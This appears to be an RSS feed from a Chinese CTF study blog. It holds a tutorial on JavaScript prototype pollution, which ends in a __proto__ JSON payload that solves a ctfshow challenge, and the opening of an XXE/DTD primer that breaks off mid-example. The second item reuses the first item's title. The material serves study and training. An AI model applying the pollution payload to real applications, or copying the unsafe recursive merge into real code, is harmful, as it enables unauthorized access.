@@ -1,0 +1,496 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>dpm12345 • Posts by &#34;ctf原理&#34; category</title>
+        <link>http://dpm12345.cn</link>
+        <description>学习记录</description>
+        <language>zh-CN</language>
+        <pubDate>Tue, 15 Aug 2023 20:15:40 +0800</pubDate>
+        <lastBuildDate>Tue, 15 Aug 2023 20:15:40 +0800</lastBuildDate>
+        <category>Qt</category>
+        <category>ms17</category>
+        <category>msf</category>
+        <category>git</category>
+        <category>CTF</category>
+        <category>sql注入</category>
+        <category>笔记</category>
+        <category>SSRF</category>
+        <category>kali</category>
+        <category>nmap</category>
+        <category>Misc</category>
+        <category>MFC</category>
+        <category>cryptography</category>
+        <category>ctfshow</category>
+        <category>Web</category>
+        <category>树</category>
+        <category>二叉树</category>
+        <category>数据结构</category>
+        <category>hexo</category>
+        <category>队列</category>
+        <category>前缀和</category>
+        <category>动态规划</category>
+        <category>滑动窗口</category>
+        <category>数组</category>
+        <category>哈希表</category>
+        <category>链表</category>
+        <category>矩阵</category>
+        <category>递归</category>
+        <category>贪心</category>
+        <category>子序列</category>
+        <category>最长公共子序列</category>
+        <category>最长回文子序列</category>
+        <category>字符串</category>
+        <category>括号</category>
+        <category>vector</category>
+        <category>栈</category>
+        <category>双指针（快慢指针）</category>
+        <category>排列组合</category>
+        <category>等差数列</category>
+        <category>深度优先搜索</category>
+        <category>广度优先搜索</category>
+        <category>ciscn</category>
+        <category>SSTI</category>
+        <category>arm-linux</category>
+        <category>Tiny6410</category>
+        <category>信息安全</category>
+        <category>linux</category>
+        <category>web</category>
+        <category>javascript</category>
+        <category>XXE</category>
+        <item>
+            <guid isPermalink="true">http://dpm12345.cn/posts/6882c75c/</guid>
+            <title>JavaScript 原型链污染(Prototype).md</title>
+            <link>http://dpm12345.cn/posts/6882c75c/</link>
+            <category>CTF</category>
+            <category>web</category>
+            <category>javascript</category>
+            <pubDate>Tue, 15 Aug 2023 20:15:40 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;JavaScript是一门非常灵活的语言，我感觉在某些方面可能比PHP更加灵活。所以，除了传统的SQL注入、代码执行等注入型漏洞外，也会有一些独有的安全问题，比如prototype污染。&lt;/p&gt;
+&lt;h1 id=&#34;prototype和-proto&#34;&gt;&lt;a href=&#34;#prototype和-proto&#34; class=&#34;headerlink&#34; title=&#34;prototype和__proto__&#34;&gt;&lt;/a&gt;&lt;code&gt;prototype&lt;/code&gt;和&lt;code&gt;__proto__&lt;/code&gt;&lt;/h1&gt;&lt;p&gt;JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;function Foo() {
+    this.state = 1
+}
+
+new Foo()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;Foo&lt;/code&gt;函数的内容，就是&lt;code&gt;Foo&lt;/code&gt;类的构造函数，而&lt;code&gt;this.state&lt;/code&gt;就是&lt;code&gt;Foo&lt;/code&gt;类的一个属性。&lt;/p&gt;
+&lt;p&gt;为了简化编写JavaScript代码，ECMAScript 6后增加了&lt;code&gt;class&lt;/code&gt;语法，但&lt;code&gt;class&lt;/code&gt;其实只是一个语法糖。&lt;/p&gt;
+&lt;p&gt;一个类必然有一些方法，类似属性&lt;code&gt;this.state&lt;/code&gt;，我们也可以将方法定义在构造函数内部：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;function Foo() {
+    this.state = 1
+    this.show = function() {
+        console.log(this.state)
+    }
+}
+
+(new Foo()).show()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;但这样写有一个问题，就是每当我们新建一个Foo对象时，&lt;code&gt;this.show = function...&lt;/code&gt;就会执行一次，这个&lt;code&gt;show&lt;/code&gt;方法实际上是绑定在对象上的，而不是绑定在“类”中。&lt;/p&gt;
+&lt;p&gt;我希望在创建类的时候只创建一次&lt;code&gt;show&lt;/code&gt;方法，这时候就则需要使用原型（prototype）了：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;function Foo() {
+    this.state = 1
+}
+
+Foo.prototype.show = function show() {
+    console.log(this.state)
+}
+
+let foo = new Foo()
+foo.show()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;我们可以认为原型&lt;code&gt;prototype&lt;/code&gt;是类&lt;code&gt;Foo&lt;/code&gt;的一个属性，而所有用&lt;code&gt;Foo&lt;/code&gt;类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的&lt;code&gt;foo&lt;/code&gt;对象，其天生就具有&lt;code&gt;foo.show()&lt;/code&gt;方法。&lt;/p&gt;
+&lt;p&gt;我们可以通过&lt;code&gt;Foo.prototype&lt;/code&gt;来访问&lt;code&gt;Foo&lt;/code&gt;类的原型，但&lt;code&gt;Foo&lt;/code&gt;实例化出来的对象，是不能通过prototype访问原型的(即，若&lt;code&gt;foo&lt;/code&gt;是&lt;code&gt;Foo&lt;/code&gt;类实例化的一个对象，那么&lt;code&gt;foo.prototype&lt;/code&gt;是无法使用的。这时候，就该&lt;code&gt;__proto__&lt;/code&gt;登场了。&lt;/p&gt;
+&lt;p&gt;一个Foo类实例化出来的foo对象，可以通过&lt;code&gt;foo.__proto__&lt;/code&gt;属性来访问Foo类的原型，也就是说：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;foo.__proto__ == Foo.prototype
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;总结：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;prototype&lt;/code&gt;是一个类的属性，所有类对象在实例化的时候将会拥有&lt;code&gt;prototype&lt;/code&gt;中的属性和方法&lt;/li&gt;
+&lt;li&gt;一个对象的&lt;code&gt;__proto__&lt;/code&gt;属性，指向这个对象所在的类的&lt;code&gt;prototype&lt;/code&gt;属性&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;JavaScript原型链继承&#34;&gt;&lt;a href=&#34;#JavaScript原型链继承&#34; class=&#34;headerlink&#34; title=&#34;JavaScript原型链继承&#34;&gt;&lt;/a&gt;JavaScript原型链继承&lt;/h1&gt;&lt;p&gt;所有类对象在实例化的时候将会拥有&lt;code&gt;prototype&lt;/code&gt;中的属性和方法，这个特性被用来实现JavaScript中的继承机制。&lt;/p&gt;
+&lt;p&gt;如：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;function Father() {
+    this.first_name = &#39;Donald&#39;
+    this.last_name = &#39;Trump&#39;
+}
+
+function Son() {
+    this.first_name = &#39;Melania&#39;
+}
+
+Son.prototype = new Father()
+
+let son = new Son()
+console.log(`Name: ${son.first_name} ${son.last_name}`)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Son类继承了Father类的&lt;code&gt;last_name&lt;/code&gt;属性，最后输出的是&lt;code&gt;Name: Melania Trump&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;总结一下，对于对象son，在调用&lt;code&gt;son.last_name&lt;/code&gt;的时候，实际上JavaScript引擎会进行如下操作：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;在对象son中寻找last_name&lt;/li&gt;
+&lt;li&gt;如果找不到，则在&lt;code&gt;son.__proto__&lt;/code&gt;中寻找last_name&lt;/li&gt;
+&lt;li&gt;如果仍然找不到，则继续在&lt;code&gt;son.__proto__.__proto__&lt;/code&gt;中寻找last_name&lt;/li&gt;
+&lt;li&gt;依次寻找，直到找到&lt;code&gt;null&lt;/code&gt;结束。比如，&lt;code&gt;Object.prototype&lt;/code&gt;的&lt;code&gt;__proto__&lt;/code&gt;就是&lt;code&gt;null&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img data-src=&#34;/./../../../post_images/javascript_prototype_1.png&#34; alt=&#34;image-20230815221255583&#34;&gt;&lt;/p&gt;
+&lt;p&gt;JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。&lt;/p&gt;
+&lt;p&gt;以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;每个构造函数(constructor)都有一个原型对象(prototype)&lt;/li&gt;
+&lt;li&gt;对象的&lt;code&gt;__proto__&lt;/code&gt;属性，指向类的原型对象&lt;code&gt;prototype&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;JavaScript使用prototype链实现继承机制&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;原型链污染&#34;&gt;&lt;a href=&#34;#原型链污染&#34; class=&#34;headerlink&#34; title=&#34;原型链污染&#34;&gt;&lt;/a&gt;原型链污染&lt;/h1&gt;&lt;p&gt;简单来说，根据前面的介绍，即对象与类之间的关系，比如一个&lt;code&gt;Foo&lt;/code&gt;类的实例对象&lt;code&gt;foo&lt;/code&gt;，&lt;code&gt;foo.__proto__ == Foo.prototype&lt;/code&gt;,如果对&lt;code&gt;foo.__proto__&lt;/code&gt;进行修改而在之后，&lt;code&gt;Foo&lt;/code&gt;类的实例化对象的属性由于继承关系将会随之改变&lt;/p&gt;
+&lt;p&gt;如下面的代码&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;// foo是一个简单的JavaScript对象
+let foo = {bar: 1}
+
+// foo.bar 此时为1
+console.log(foo.bar)
+
+// 修改foo的原型（即Object）
+foo.__proto__.bar = 2
+
+// 由于查找顺序的原因，foo.bar仍然是1
+console.log(foo.bar)
+
+// 此时再用Object创建一个空的zoo对象
+let zoo = {}
+
+// 查看zoo.bar
+console.log(zoo.bar)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;/./../../../post_images/javascript_prototype_2.png&#34; alt=&#34;image-20230815221822410&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到输出了&lt;code&gt;1 1 2&lt;/code&gt;，证明原型链被污染，成功修改了原来的类&lt;/p&gt;
+&lt;p&gt;原理：因为前面我们修改了foo的原型&lt;code&gt;foo.__proto__.bar = 2&lt;/code&gt;，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。&lt;/p&gt;
+&lt;p&gt;后来，我们又用Object类创建了一个zoo对象&lt;code&gt;let zoo = {}&lt;/code&gt;，zoo对象自然也有一个bar属性了。&lt;/p&gt;
+&lt;p&gt;那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是&lt;strong&gt;原型链污染&lt;/strong&gt;。&lt;/p&gt;
+&lt;h1 id=&#34;原型链污染可能发生的场景&#34;&gt;&lt;a href=&#34;#原型链污染可能发生的场景&#34; class=&#34;headerlink&#34; title=&#34;原型链污染可能发生的场景&#34;&gt;&lt;/a&gt;原型链污染可能发生的场景&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;对象merge&lt;/li&gt;
+&lt;li&gt;对象clone（其实内核就是将待操作的对象merge到一个空对象中）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;以对象merge为例，我们想象一个简单的merge函数：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;function merge(target, source) {
+    for (let key in source) {
+        if (key in source &amp;amp;&amp;amp; key in target) {
+            merge(target[key], source[key])
+        } else {
+            target[key] = source[key]
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在合并的过程中，存在赋值的操作&lt;code&gt;target[key] = source[key]&lt;/code&gt;，那么，这个key如果是&lt;code&gt;__proto__&lt;/code&gt;，就可以顺势原型链污染&lt;/p&gt;
+&lt;p&gt;用如下代码实验一下：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;let o1 = {}
+let o2 = {a: 1, &#34;__proto__&#34;: {b: 2}}
+merge(o1, o2)
+console.log(o1.a, o1.b)
+
+o3 = {}
+console.log(o3.b)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;/./../../../post_images/javascript_prototype_3.png&#34; alt=&#34;image-20230815222140080&#34;&gt;&lt;/p&gt;
+&lt;p&gt;但现在的输出似乎与之前的设想有所违背，但这是因为，我们用JavaScript创建o2的过程（&lt;code&gt;let o2 = {a: 1, &#34;__proto__&#34;: {b: 2}}&lt;/code&gt;）中，&lt;code&gt;__proto__&lt;/code&gt;已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是&lt;code&gt;[a, b]&lt;/code&gt;，拿到的仅为&lt;code&gt;{a:1,b:2}&lt;/code&gt;，&lt;code&gt;__proto__&lt;/code&gt;并不是一个key，自然也不会修改Object的原型。&lt;/p&gt;
+&lt;p&gt;而要让&lt;code&gt;__proto__&lt;/code&gt;被识别为一个键，下面的写法可以实现&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;let o1 = {}
+let o2 = JSON.parse(&#39;{&#34;a&#34;: 1, &#34;__proto__&#34;: {&#34;b&#34;: 2}}&#39;)
+merge(o1, o2)
+console.log(o1.a, o1.b)
+
+o3 = {}
+console.log(o3.b)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里使用&lt;code&gt;JSON.parse&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/./../../../post_images/javascript_prototype_4.png&#34; alt=&#34;image-20230815222650451&#34;&gt;&lt;/p&gt;
+&lt;p&gt;成功修改了&lt;code&gt;b&lt;/code&gt;，从而实现了原型链污染&lt;/p&gt;
+&lt;p&gt;这是因为，JSON解析的情况下，&lt;code&gt;__proto__&lt;/code&gt;会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。&lt;/p&gt;
+&lt;h1 id=&#34;例子&#34;&gt;&lt;a href=&#34;#例子&#34; class=&#34;headerlink&#34; title=&#34;例子&#34;&gt;&lt;/a&gt;例子&lt;/h1&gt;&lt;p&gt;ctfshow web入门 web 338&lt;/p&gt;
+&lt;p&gt;common.js&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;module.exports = {
+  copy:copy
+};
+
+function copy(object1, object2){
+    for (let key in object2) {
+        if (key in object2 &amp;amp;&amp;amp; key in object1) {
+            copy(object1[key], object2[key])
+        } else {
+            object1[key] = object2[key]
+        }
+    }
+  }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;而在login.js中&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;/* GET home page.  */
+router.post(&#39;/&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) {
+  res.type(&#39;html&#39;);
+  var flag=&#39;flag_here&#39;;
+  var secert = {};
+  var sess = req.session;
+  let user = {};
+  utils.copy(user,req.body);
+  if(secert.ctfshow===&#39;36dboy&#39;){
+    res.end(flag);
+  }else{
+    return res.json({ret_code: 2, ret_msg: &#39;登录失败&#39;+JSON.stringify(user)});  
+  }
+  
+  
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;通过调用copy将请求发送来的json数据进行copy，而在该代码中，&lt;code&gt;secret={}&lt;/code&gt;，为了使得其有属性&lt;code&gt;ctfshow&lt;/code&gt;，故可以通过修改发送的json数据，添加&lt;code&gt;__proto__&lt;/code&gt;，增添&lt;code&gt;ctfshow：&#39;36dboy&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;，从而影响Object类，继承，从而使得secret含有属性&lt;code&gt;ctfshow&lt;/code&gt;,并且值为&lt;code&gt;36dboy&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/./../../../post_images/ctfshow/Web-vip/web_338_1.png&#34; alt=&#34;web_338_1&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://dpm12345.cn/posts/6882c75c/</guid>
+            <title>JavaScript 原型链污染(Prototype).md</title>
+            <link>http://dpm12345.cn/posts/6882c75c/</link>
+            <category>CTF</category>
+            <category>web</category>
+            <category>XXE</category>
+            <pubDate>Thu, 15 Jun 2023 20:15:40 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;简单了解XXE&#34;&gt;&lt;a href=&#34;#简单了解XXE&#34; class=&#34;headerlink&#34; title=&#34;简单了解XXE&#34;&gt;&lt;/a&gt;简单了解XXE&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;XML 指可扩展标记语言（EXtensible Markup Language）&lt;/li&gt;
+&lt;li&gt;XML 是一种标记语言，很类似 HTML&lt;/li&gt;
+&lt;li&gt;XML 被设计为传输和存储数据，其焦点是数据的内容&lt;/li&gt;
+&lt;li&gt;XML 被设计用来结构化、存储以及传输信息&lt;/li&gt;
+&lt;li&gt;XML 允许创作者定义自己的标签和自己的文档结构&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;语法&#34;&gt;&lt;a href=&#34;#语法&#34; class=&#34;headerlink&#34; title=&#34;语法&#34;&gt;&lt;/a&gt;语法&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;* 注释与HTML相似,为 &amp;lt;!-- 和 --&amp;gt;
+* 大小写敏感
+* 必须有，且只能有一个根元素(如上，根元素即为 students)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;结构&#34;&gt;&lt;a href=&#34;#结构&#34; class=&#34;headerlink&#34; title=&#34;结构&#34;&gt;&lt;/a&gt;结构&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;XML 文档声明，在文档的第一行
+XML 文档类型定义，即DTD，XXE 漏洞所在的地方
+XML 文档元素
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;XML文档&#34;&gt;&lt;a href=&#34;#XML文档&#34; class=&#34;headerlink&#34; title=&#34;XML文档&#34;&gt;&lt;/a&gt;XML文档&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34; standalone=&#34;yes&#34;?&amp;gt;
+&amp;lt;!--第一行是XML声明--&amp;gt;
+&amp;lt;!--这是XML处理指令的例子。处理指令以&amp;lt;?开始，以?&amp;gt;结束--&amp;gt;
+&amp;lt;!--在&amp;lt;?后的第一个单词是处理指令名，在本例中是xml--&amp;gt;
+&amp;lt;!--处理指令一定要顶格写，前面不能有任何空白--&amp;gt;
+
+&amp;lt;students&amp;gt;
+
+    &amp;lt;GREETING&amp;gt;&amp;lt;!--开始标记--&amp;gt; Hello World &amp;lt;!--元素内容--&amp;gt;
+    &amp;lt;/GREETING&amp;gt;&amp;lt;!--结束标记--&amp;gt;
+
+    &amp;lt;student gender=&#34;male&#34; isHandsome=&#34;true&#34;&amp;gt;
+        &amp;lt;id&amp;gt;001&amp;lt;/id&amp;gt;
+        &amp;lt;name&amp;gt;zhangsan&amp;lt;/name&amp;gt;
+        &amp;lt;address&amp;gt;Beijing&amp;lt;/address&amp;gt;
+        &amp;lt;score&amp;gt;50&amp;lt;/score&amp;gt;
+    &amp;lt;/student&amp;gt;
+
+    &amp;lt;student gender=&#34;female&#34;&amp;gt;
+        &amp;lt;id&amp;gt;002&amp;lt;/id&amp;gt;
+        &amp;lt;name&amp;gt;lisi&amp;lt;/name&amp;gt;
+        &amp;lt;address&amp;gt;北京&amp;lt;/address&amp;gt;
+        &amp;lt;score /&amp;gt;&amp;lt;!--为空的简写形式--&amp;gt;
+    &amp;lt;/student&amp;gt;
+
+&amp;lt;/students&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;文档说明&#34;&gt;&lt;a href=&#34;#文档说明&#34; class=&#34;headerlink&#34; title=&#34;文档说明&#34;&gt;&lt;/a&gt;文档说明&lt;/h3&gt;&lt;p&gt;每一个XML文档都以一个XML声明开始，用以指明所用的XML的版本。&lt;/p&gt;
+&lt;p&gt;XML声明有 version 、encoding 和 standalone 特性。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;version特性表明这个文档符合XML 1.0规范。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;encoding 属性指定了编码格式，默认情况下是&lt;strong&gt;utf-8&lt;/strong&gt;，这个属性要放在属性前面。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;像standalone是XML文档的属性，位于等号左边的是特姓名，而其值位于等号的右边，并用&lt;strong&gt;双引号或单引号&lt;/strong&gt;括起来。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;自定义的元素也可以有一个或多个属性，其属性值使用单引号或者双引号括起来&lt;/p&gt;
+&lt;p&gt;属性的形式为：&lt;strong&gt;属性名= “属性值”，&lt;/strong&gt;比如 &lt;code&gt;gender=&#34;male&#34;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;多个属性值之间用空格隔开（一个或多个空格都可以）&lt;/p&gt;
+&lt;p&gt;在一个元素上，相同的属性只能出现一次&lt;/p&gt;
+&lt;p&gt;属性值不能包含&lt;code&gt;&amp;lt;&lt;/code&gt;, &lt;code&gt;&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;amp;&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;实体&#34;&gt;&lt;a href=&#34;#实体&#34; class=&#34;headerlink&#34; title=&#34;实体&#34;&gt;&lt;/a&gt;实体&lt;/h3&gt;&lt;p&gt;实体叫ENTITY，实体的作用是避免重复输入。在XML中，有 5 个预定义的实体引用&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th align=&#34;center&#34;&gt;实体&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;符号&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;&lt;code&gt;&amp;amp;it;&lt;/code&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;&amp;lt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;&lt;code&gt;&amp;amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;&amp;gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;&lt;code&gt;&amp;amp;amp;&lt;/code&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;&amp;amp;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;&lt;code&gt;&amp;amp;quot;&lt;/code&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;“&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;&lt;code&gt;&amp;amp;apos;&lt;/code&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;‘&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;p&gt;&lt;strong&gt;自定义实体语法：&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;&amp;lt;!DOCTYPE 根元素[
+&amp;lt;!ENTITY 实体名 &#34;实体内容&#34;&amp;gt;
+
+]&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;处理指令PI&#34;&gt;&lt;a href=&#34;#处理指令PI&#34; class=&#34;headerlink&#34; title=&#34;处理指令PI&#34;&gt;&lt;/a&gt;处理指令PI&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;处理指令&lt;/strong&gt;用于XML解析器传递信息到应用程序。&lt;/p&gt;
+&lt;p&gt;语法：&lt;code&gt;&amp;lt;?目标 指令?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;PI必须以一个叫做目标的标识符开头，这个标识符遵从如同元素和属性一样的规则，&lt;strong&gt;目标&lt;/strong&gt;是指令所指向的应用的名称，&lt;strong&gt;指令&lt;/strong&gt;是传递给应用程序的信息。&lt;/p&gt;
+&lt;h3 id=&#34;CDATA节&#34;&gt;&lt;a href=&#34;#CDATA节&#34; class=&#34;headerlink&#34; title=&#34;CDATA节&#34;&gt;&lt;/a&gt;CDATA节&lt;/h3&gt;&lt;p&gt;用于把整段文本解释为纯字符数据而不是标记的情况。&lt;/p&gt;
+&lt;p&gt;包含大量的&amp;lt;、&amp;gt;、&amp;amp;、或者”字符。CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是XML标记。&lt;/p&gt;
+&lt;p&gt;可以放置除&lt;code&gt;]]&amp;gt;&lt;/code&gt;外的任何字符，不能嵌套&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;&amp;lt;![CDATA[
+......
+]]&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;PCDATA节&#34;&gt;&lt;a href=&#34;#PCDATA节&#34; class=&#34;headerlink&#34; title=&#34;PCDATA节&#34;&gt;&lt;/a&gt;PCDATA节&lt;/h3&gt;&lt;p&gt;&lt;code&gt;PCDATA&lt;/code&gt;表示已解析的字符数据。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;PCDATA&lt;/code&gt;的意思是被解析的字符数据&lt;code&gt;（parsed character data）&lt;/code&gt;。可以把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。&lt;code&gt;PCDATA&lt;/code&gt;是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。但是，被解析的字符数据不应当包含任何&lt;code&gt;&amp;amp; &amp;lt; &amp;gt;&lt;/code&gt;字符；需要使用&lt;code&gt;&amp;amp; &amp;lt; &amp;gt;&lt;/code&gt;实体来分别替换它们。&lt;/p&gt;
+&lt;h2 id=&#34;DTD&#34;&gt;&lt;a href=&#34;#DTD&#34; class=&#34;headerlink&#34; title=&#34;DTD&#34;&gt;&lt;/a&gt;DTD&lt;/h2&gt;&lt;p&gt;&lt;code&gt;XXE漏洞存在的地方&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;三种应用形式&#34;&gt;&lt;a href=&#34;#三种应用形式&#34; class=&#34;headerlink&#34; title=&#34;三种应用形式&#34;&gt;&lt;/a&gt;三种应用形式&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;1.内部DTD文档
+&amp;lt;!DOCTYPE 根元素[定义内容]&amp;gt;
+
+2.外部DTD文档
+&amp;lt;!DOCTYPE 根元素 SYSTEM &#34;DTD文件路径&#34;&amp;gt;
+
+3.内外部DTD文档结合
+&amp;lt;!DOCTYPE 根元素 SYSTEM &#34;DTD文件路径&#34; [定义内容]&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34;?&amp;gt;
+&amp;lt;!DOCTYPE note [
+    &amp;lt;!ELEMENT note (to,from,heading,body)&amp;gt;
+    &amp;lt;!ELEMENT to (#PCDATA)&amp;gt;
+    &amp;lt;!ELEMENT from (#PCDATA)&amp;gt;
+    &amp;lt;!ELEMENT heading (#PCDATA)&amp;gt;
+    &amp;lt;!ELEMENT body (#PCDATA)&amp;gt;
+]&amp;gt;
+&amp;lt;note&amp;gt;
+    &amp;lt;to&amp;gt;Tove&amp;lt;/to&amp;gt;
+    &amp;lt;from&amp;gt;Jani&amp;lt;/from&amp;gt;
+    &amp;lt;heading&amp;gt;Reminder&amp;lt;/heading&amp;gt;
+    &amp;lt;body&amp;gt;Don&#39;t forget me this weekend&amp;lt;/body&amp;gt;
+&amp;lt;/note&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在这里，以下有点类似于类型说明，&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;&amp;lt;!ELEMENT note (to,from,heading,body)&amp;gt;
+&amp;lt;!ELEMENT to (#PCDATA)&amp;gt;
+&amp;lt;!ELEMENT from (#PCDATA)&amp;gt;
+&amp;lt;!ELEMENT heading (#PCDATA)&amp;gt;
+&amp;lt;!ELEMENT body (#PCDATA)&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如果采用外部DTD文档，那么将上面的内容写到&lt;code&gt;note.dtd&lt;/code&gt;的话，即，有点类似于头文件的作用，变量声明&lt;/p&gt;
+&lt;p&gt;note.dtd&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;&amp;lt;!ELEMENT note (to,from,heading,body)&amp;gt;
+&amp;lt;!ELEMENT to (#PCDATA)&amp;gt;
+&amp;lt;!ELEMENT from (#PCDATA)&amp;gt;
+&amp;lt;!ELEMENT heading (#PCDATA)&amp;gt;
+&amp;lt;!ELEMENT body (#PCDATA)&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;那么原来的文件可以改为&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34;?&amp;gt;
+&amp;lt;!DOCTYPE note SYSTEM &#34;note.dtd&#34;&amp;gt;
+&amp;lt;note&amp;gt;
+  &amp;lt;to&amp;gt;Tove&amp;lt;/to&amp;gt;
+  &amp;lt;from&amp;gt;Jani&amp;lt;/from&amp;gt;
+  &amp;lt;heading&amp;gt;Reminder&amp;lt;/heading&amp;gt;
